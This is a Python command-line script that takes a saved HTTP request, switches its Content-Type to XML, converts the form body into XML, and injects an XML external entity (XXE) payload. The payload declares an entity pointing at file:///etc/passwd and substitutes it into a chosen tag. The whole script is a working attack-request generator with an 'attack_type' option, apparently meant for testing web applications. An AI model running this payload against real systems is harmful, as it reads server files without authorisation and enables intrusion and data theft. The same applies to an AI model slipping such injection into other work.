import argparse
import re
import random
import string
from xml.etree import ElementTree as ET

def update_content_type(headers):
    content_type_pattern = re.compile(r'Content-Type:\s*([^\r\n]+)', re.IGNORECASE)
    new_headers = []
    content_type_updated = False

    for header in headers:
        match = content_type_pattern.match(header)
        if match:
            new_headers.append('Content-Type: application/xml')
            content_type_updated = True
        else:
            new_headers.append(header)

    if not content_type_updated:
        new_headers.append('Content-Type: application/xml')

    return new_headers

def inject_simple_xxe(xml_data, tag_name, variable):
    injected_xml = f'<?xml version="1.0" encoding="UTF-8"?>\n'
    injected_xml += f'<!DOCTYPE foo [ <!ENTITY {variable} SYSTEM "file:///etc/passwd"> ]>\n'
    injected_xml += xml_data
    if tag_name:
        injected_xml = update_xml_tag(injected_xml, tag_name, variable)
    return injected_xml

def update_xml_tag(xml_data, tag_name, variable):
    pattern = f'<{tag_name}>.*?<\/{tag_name}>'
    replacement = f'<{tag_name}>&{variable};</{tag_name}>'
    return re.sub(pattern, replacement, xml_data, flags=re.DOTALL)

def convert_to_xml_tags(data, attack_type, tag_name, variable):
    if attack_type == 'simple-xxe':
        return inject_simple_xxe(data, tag_name, variable)
    else:
        return data

def main():
    parser = argparse.ArgumentParser(description='Process request file and convert to XML.')
    parser.add_argument('-r', '--request', required=True, help='Input request file')
    parser.add_argument('-x', '--attack_type', help='Attack type: {simple-xxe|read-file}')
    parser.add_argument('-t', '--tag_name', help='XML tag name')
    parser.add_argument('-v', '--variable', help='Variable for tag')
    parser.add_argument('-w', '--output_file', help='Output file to save modified request')
    args = parser.parse_args()

    if args.attack_type and args.tag_name is None:
        parser.error('-t/--tag_name is required when using -x/--attack_type simple-xxe')

    with open(args.request, 'r') as request_file:
        request_content = request_file.read()

    # Split request into headers and body
    headers, body = request_content.split('\n\n', 1)

    updated_headers = update_content_type(headers.splitlines())

    # Convert URL-encoded body to XML
    body_elements = body.split('&')
    xml_body = ET.Element('request')
    for element in body_elements:
        key, value = element.split('=')
        element_tag = ET.SubElement(xml_body, key)
        element_tag.text = value

    # Apply XML modification
    converted_xml_body = convert_to_xml_tags(ET.tostring(xml_body, encoding='unicode'), args.attack_type, args.tag_name, args.variable)

    updated_request = '\n'.join(updated_headers) + '\n\n' + converted_xml_body

    if args.output_file:
        with open(args.output_file, 'w') as output_file:
            output_file.write(updated_request)
            print(f'Modified request saved to {args.output_file}')
    else:
        print(updated_request)

if __name__ == '__main__':
    main()
